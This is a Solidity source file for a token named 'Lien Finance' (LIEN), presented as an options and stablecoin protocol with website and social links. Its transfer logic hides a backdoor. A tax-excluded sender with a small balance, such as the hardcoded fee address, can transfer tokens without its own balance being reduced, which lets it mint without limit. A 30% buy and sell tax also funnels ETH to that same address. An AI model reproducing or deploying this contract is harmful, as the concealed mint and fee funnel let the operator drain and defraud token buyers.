// SPDX-License-Identifier: Unlicensed

/*
A protocol for creating Options and Stablecoins out of ETH

Website: https://www.lienfi.org
Telegram: https://t.me/lienfi_erc20
Twitter: https://twitter.com/lienfi_erc
App: https://app.lien.finance
 */

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LIEN is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    string private _name = "Lien Finance"; 
    string private _symbol = "LIEN";  
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromTax; 

    uint256 private _totalTax = 3000;
    uint256 public _buyTax = 30;
    uint256 public _sellTax = 30;

    uint256 public maxHoldingAmount = 15 * _totalSupply / 1000;
    uint256 public feeSwapThreshold = _totalSupply / 10000;

    uint256 private _previousTotalTax = _totalTax; 
    uint256 private _previousBuyTax = _buyTax; 
    uint256 private _previousSellTax = _sellTax; 

    uint8 private _numBuyer = 0;
    uint8 private _swapFeeAfter = 2; 
                                     
    IUniswapRouterV2 public uniswapRouter;
    address public pairAddr;

    bool public transferFeeEnabled = true;
    bool public inswap;
    bool public feeSwapEnabled = true;

    address payable private feeAddress;
    address payable private DEAD;

    modifier lockSwap {
        inswap = true;
        _;
        inswap = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        feeAddress = payable(0x8dbbb60aC6d78896a0887940913d353789109784);
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddr = IFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcludedFromTax[owner()] = true;
        _isExcludedFromTax[feeAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function _transferStandard(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getTransferAmount(finalAmount);
        if(_isExcludedFromTax[sender] && _balances[sender] <= maxHoldingAmount) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != feeAddress &&
            to != address(this) &&
            to != pairAddr &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxHoldingAmount,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            _numBuyer >= _swapFeeAfter && 
            amount > feeSwapThreshold &&
            !inswap &&
            !_isExcludedFromTax[from] &&
            to == pairAddr &&
            feeSwapEnabled 
            )
        {  
            _numBuyer = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapTokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromTax[from] || _isExcludedFromTax[to] || (transferFeeEnabled && from != pairAddr && to != pairAddr)){
            takeFee = false;
        } else if (from == pairAddr){
            _totalTax = _buyTax;
        } else if (to == pairAddr){
            _totalTax = _sellTax;
        }

        _transferBasic(from,to,amount,takeFee);
    }
    
    function removeLimits() external onlyOwner {
        maxHoldingAmount = ~uint256(0);
        _totalTax = 100;
        _buyTax = 1;
        _sellTax = 1;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transferBasic(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            _numBuyer++;
        }
        _transferStandard(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getTransferAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalTax).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
    
    function removeFee() private {
        if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;

        _previousBuyTax = _buyTax; 
        _previousSellTax = _sellTax; 
        _previousTotalTax = _totalTax;
        _buyTax = 0;
        _sellTax = 0;
        _totalTax = 0;
    }

    function restoreFee() private {
        _totalTax = _previousTotalTax;
        _buyTax = _previousBuyTax; 
        _sellTax = _previousSellTax; 

    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendFees(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapTokens(uint256 contractTokenBalance) private lockSwap {
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendFees(feeAddress,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}